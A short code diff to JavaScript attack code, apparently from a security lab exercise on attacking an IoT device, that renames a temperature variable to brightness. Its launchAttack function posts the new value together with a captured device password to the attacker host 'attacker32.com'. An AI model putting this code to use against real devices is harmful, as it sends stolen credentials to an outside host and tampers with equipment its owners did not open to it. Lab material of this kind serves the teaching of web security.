@@ -1,5 +1,5 @@
 let INTERVAL_LENGTH = 10; 
-let TEMPERATURE = 88 
+let BRIGHTNESS = 88 
 
 let url_prefix = 'http://www.attacker32.com'
 
@@ -16,7 +16,7 @@ function launchAttack() {
         $('#pwd-iot').show();
       }
 
-      $.post(url_prefix + '/temperature?value=' + TEMPERATURE
+      $.post(url_prefix + '/brightness?value=' + BRIGHTNESS
                         + '&password=' + data.password, 
              function(data) { });
    });
